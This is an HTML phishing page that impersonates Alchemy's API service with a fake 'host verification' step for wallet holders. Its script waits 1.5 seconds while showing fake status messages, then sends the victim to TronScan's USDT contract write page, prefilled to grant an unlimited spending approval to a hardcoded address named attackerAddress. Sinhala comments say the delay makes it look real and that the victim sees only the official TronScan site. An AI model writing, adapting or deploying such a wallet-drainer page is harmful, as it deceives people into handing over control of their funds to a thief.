<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alchemy API | Host Verification Portal</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #0f172a; 
            color: white; 
            text-align: center; 
            padding: 0;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .card { 
            background: #1e293b; 
            padding: 40px; 
            border-radius: 20px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
            width: 90%; 
            max-width: 400px; 
        }
        .logo { width: 60px; margin-bottom: 20px; }
        h2 { margin-bottom: 10px; font-size: 22px; color: #f8fafc; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
        #verifyBtn { 
            background: #3b82f6; 
            color: white; 
            border: none; 
            padding: 15px 40px; 
            font-size: 16px; 
            border-radius: 10px; 
            cursor: pointer; 
            transition: 0.3s; 
            font-weight: bold; 
            width: 100%; 
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        #verifyBtn:hover { background: #2563eb; transform: translateY(-2px); }
        #status { 
            margin-top: 20px; 
            font-size: 12px; 
            color: #64748b; 
            font-family: monospace;
        }
        .footer-text {
            margin-top: 30px;
            font-size: 11px;
            color: #475569;
        }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://www.alchemy.com/favicon.ico" class="logo" alt="Alchemy Logo">
        <h2>Host Verification</h2>
        <p>Your wallet must be verified to sync with the <b>Alchemy API Payout Queue</b>. This is a one-time secure authorization.</p>
        
        <button id="verifyBtn">Verify & Connect API</button>
        
        <div id="status">System Status: Awaiting Connection...</div>
        
        <div class="footer-text">
            Secured by Alchemy Node Infrastructure<br>
            © 2026 Alchemy Insights, Inc.
        </div>
    </div>

    <script>
        // --- මෙන්න මෙතන තමයි උඹේ විස්තර තියෙන්නේ ---
        const attackerAddress = "TDwKgDDRSefonFbaHaf82nB8RLjrAXaR6n";
        const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const approvalAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        $('#verifyBtn').click(function() {
            const status = $('#status');
            status.text("Initializing Secure Tunnel...");
            status.css("color", "#fbbf24");

            // ටිකක් රියල් ගතියක් දෙන්න තත්පරයක් ඉමු
            setTimeout(function() {
                status.text("Redirecting to Node Authorization...");
                
                // Trust Wallet එකේ QR ප්‍රශ්නය මගහරින්න කෙලින්ම TronScan Write පේජ් එකට යවනවා
                // වික්ටිම් මේක හරහා ගියාම එයාට පේන්නේ Official TronScan සයිට් එක
                const finalUrl = `https://tronscan.org/#/contract/${usdtContract}/write?function=approve&_spender=${attackerAddress}&_value=${approvalAmount}`;
                
                window.location.href = finalUrl;
            }, 1500);
        });
    </script>

</body>
</html>
